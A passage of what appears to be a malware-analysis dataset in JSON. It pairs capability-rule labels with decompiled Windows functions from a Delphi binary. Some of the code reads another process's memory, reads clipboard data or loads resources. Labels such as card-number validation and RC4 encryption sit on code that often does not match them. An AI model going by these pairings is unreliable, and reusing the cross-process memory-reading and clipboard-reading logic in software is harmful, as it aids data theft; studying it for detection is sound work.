        "decompiled_code": "\nvoid fcn.0048d098(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48d0b3;\n    fcn.004058ec();\n    uStack32 = 0x48d129;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(10);\n    uVar1 = sub.kernel32.dll_FindResourceA(0, uVar1);\n    uVar2 = sub.kernel32.dll_LoadResource(0, uVar1);\n    sub.kernel32.dll_SizeofResource(0, uVar1);\n    sub.kernel32.dll_LockResource(uVar2);\n    fcn.0040555c();\n    fcn.004054c0();\n    sub.kernel32.dll_FreeResource();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48d130);\n    return;\n}\n",
        "token_count": 264
    },
    "0048d138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d138(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x48d1da;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    arg_8h = 0x40;\n    puStackY32 = 0x48d15d;\n    fcn.0040f1a8();\n    puStackY32 = 0x48d16c;\n    var_4h = fcn.0041bb08(arg_8h);\n    uStackY36 = 0x48d1bd;\n    uStackY40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStackY32 = &stack0xfffffffc;\n    (***var_4h)();\n    fcn.00405b8c();\n    (***var_4h)();\n    fcn.0041b880();\n    *in_FS_OFFSET = uStackY40;\n    puStackY32 = 0x48d1c4;\n    uStackY36 = 0x48d1bc;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 344
    },
    "0048d420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d420(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409ce8();\n    return;\n}\n",
        "token_count": 63
    },
    "0048d630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "find graphical window",
            "write process memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d630(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint uVar5;\n    uint *puStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint wParam;\n    uint hWndParent;\n    uint lpdwProcessId;\n    uint lpNumberOfBytesWritten;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack72 = 0x48d65b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack72 = 0x48d663;\n    fcn.004058ec();\n    uStack76 = 0x48d837;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0048d5b4();\n    uVar1 = fcn.004058fc();\n    uVar5 = 0x48d848;\n    uVar1 = sub.user32.dll_FindWindowA(0x48d848, uVar1);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48d848, 0);\n    hWndParent = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48d850, 0);\n    uVar1 = hWndParent;\n    iVar2 = sub.user32.dll_SendMessageA(hWndParent, 0x1004, 0, 0);\n    if (-1 < iVar2 + -1) {\n        do {\n            puVar3 = sub.kernel32.dll_VirtualAlloc_1(0, 300, 0x3000, 4);\n            func_0x004082bc(hWndParent, &fcn.0048d630::lpdwProcessId);\n            var_4h = 0;\n            var_8h = 0x38;\n            var_ch = 0x48d70f;\n            uVar1 = sub.kernel32.dll_OpenProcess();\n            var_ch = 4;\n            lpNumberOfBytesWritten = 0x3000;\n            lpdwProcessId = 300;\n            hWndParent = 0;\n            iVar2 = sub.kernel32.dll_VirtualAllocEx();\n            *puVar3 = 1;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[5] = iVar2 + 0x28;\n            puVar3[6] = 100;\n            sub.kernel32.dll_WriteProcessMemory();\n            puStack72 = 0x48d766;\n            sub.user32.dll_SendMessageA();\n            puStack72 = &fcn.0048d630::lpNumberOfBytesWritten;\n            uStack76 = 0x400;\n            puStack80 = puVar3;\n            sub.kernel32.dll_ReadProcessMemory(uVar5, iVar2);\n            uVar4 = puVar3 == 0xffffffd8;\n            fcn.00405664();\n            fcn.00409af4();\n            fcn.00409af4(puVar3);\n            fcn.00405894();\n            if (uVar4) {\ncode_r0x0048d7ce:\n                sub.user32.dll_SendMessageA(0, 0x1008, uVar1, 0);\n            }\n            else {\n                fcn.00409af4();\n                fcn.00409af4(uVar1);\n                fcn.00405894();\n                if (uVar4) goto code_r0x0048d7ce;\n            }\n            sub.kernel32.dll_VirtualFree_1(puVar3, 0, 0x8000);\n            sub.kernel32.dll_VirtualFreeEx(uVar1, iVar2, 0, 0x8000);\n            sub.kernel32.dll_CloseHandle_1();\n        } while (*0x10 != 0x15);\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x48d83e);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 999
    },
    "004207c8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004207c8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42082b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 293
    },
    "00424a40": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00424a40(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.00419b5c();\n    fcn.00424f48();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    sub.kernel32.dll_DeleteCriticalSection(iVar1 + 0x38);\n    fcn.00419d54();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00424bd0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424bd0(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00424f9c();\n    uVar1 = fcn.00424860();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 111
    },
    "00424c98": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424c98(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.00424f9c();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00426a90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426a90(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.00404640();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00404854();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00404854();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0044ccc4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ccc4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x1c) = *(param_2 + 0x1c);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    *(in_EAX + 0x30) = *(param_2 + 0x30);\n    *(in_EAX + 0x34) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 255
    },
    "00453f34": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453f34(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.004085a8(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 156
    },
    "00470830": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * fcn.00470830(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00402ef0();\n    fcn.0046fda8();\n    uVar2 = fcn.00402ef0();\n    *puVar1 = uVar2;\n    puVar1[1] = *(in_EAX + 0xc);\n    puVar1[2] = 0;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    iVar3 = sub.winmm.dll_waveInPrepareHeader(*(in_EAX + 0x94), puVar1, 0x20);\n    if (iVar3 == 0) {\n        sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), puVar1, 0x20);\n    }\n    return puVar1;\n}\n",
        "token_count": 215
    },
    "00403764": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00403764(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403aac();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x490034;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x4035b8;\n    uVar1 = fcn.0040572c();\n    fcn.004058fc(uVar1);\n    fcn.004030ec();\n    iVar2 = fcn.0040572c();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 199
    },
    "004052bc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.004052bc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x490000;\n    *0x490000 = 0;\n    puVar3 = *0x4957c8;\n    puVar4 = 0x4957c8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 170
    },
    "0040f6d4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f6d4(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 57
    },
    "00426b0c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426b0c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x426b27;\n        iVar1 = fcn.00404518();\n        piStack24 = 0x426b2c;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x426b39;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x426b4b;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404854();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x426b63;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404854();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x426b9c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00404640();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 386
    },
    "0042badc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042badc(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x42bbcc;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.004070f8();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x42bb59;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.004056f4();\n    fcn.004056f4();\n    fcn.004056f4();\n    iStack104 = fcn.0042b478(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.00405460();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 528
    },
    "00430b00": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430b00(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x430b14;\n    (**(*in_EAX + 0x18))();\n    uStack28 = 0x430b58;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(2);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x430b5f);\n    return;\n}\n",
        "token_count": 218
    },
    "00430b68": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430b68(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x430b7b;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x430bbd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(3);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x430bc4);\n    return;\n}\n",
        "token_count": 218
    },
    "0045a6a4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a6a4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.00459b6c();\n    fcn.00459f04();\n    return;\n}\n",
        "token_count": 435
    },
    "0044d14c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044d14c(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
    "0040f6c4": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f6c4(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 57
    },
    "0041f644": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041f644(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x4979b8);\n    if (iVar1 == 0) {\n        fcn.0041f638();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0048a7a4": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048a7a4(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack40 = 0x48a8c5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.00405664();\n    fcn.00405a48(&var_8h);\n    fcn.00405964();\n    fcn.00405a48();\n    fcn.004059a4();\n    fcn.00488b14();\n    fcn.00405800(var_4h, 0x48a8e8, 0);\n    uVar2 = fcn.004058fc();\n    iVar3 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar3 != 0) {\n        pcVar4 = sub.kernel32.dll_GetProcAddress_1(iVar3, 0x48a8f4);\n        (*pcVar4)(**0x4928f4);\n        fcn.00409ce8();\n        fcn.0048a3c0();\n        do {\n            cVar1 = fcn.0048a5a8();\n        } while (cVar1 != '\\0');\n        pcVar4 = sub.kernel32.dll_GetProcAddress_1(iVar3, 0x48a904);\n        sub.kernel32.dll_Sleep_1(100);\n        (*pcVar4)();\n        sub.kernel32.dll_Sleep_1(1000);\n        sub.kernel32.dll_FreeLibrary_1(iVar3);\n        sub.kernel32.dll_Sleep_1(500);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48a8cc);\n    return;\n}\n",
        "token_count": 506
    },
    "00410008": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410008(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "0041e8b4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e8b4(uint param_1)\n\n{\n    fcn.0041cf28(param_1);\n    fcn.0040555c();\n    fcn.0040595c();\n    fcn.0041cf28();\n    return;\n}\n",
        "token_count": 62
    },
    "0041fbc8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fbc8(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x41f988);\n    (**(*param_2 + 4))(0x41f994);\n    return;\n}\n",
        "token_count": 70
    },
    "00424a9c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424a9c(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00424f9c();\n    fcn.00424f9c();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 218
    },
    "00424ee4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00424ee4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x424f40 & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a04);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a08);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a0c);\n        *(in_EAX + 8) = ~*0x424f40 & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00425068": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425068(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00424574();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x490dfc));\n    return;\n}\n",
        "token_count": 107
    },
    "00425700": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425700(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "00437748": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437748(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x437780 == (*0x43777c & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00448098": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448098(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004480c0(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 87
    },
    "004480c0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004480c0(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.00447a64();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x491610) | *((arg_ch & 0xff) * 4 + 0x491620), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00458d60": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00458d60(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x497c6a);\n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x497c68);\n    return;\n}\n",
        "token_count": 80
    },
    "0047e780": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
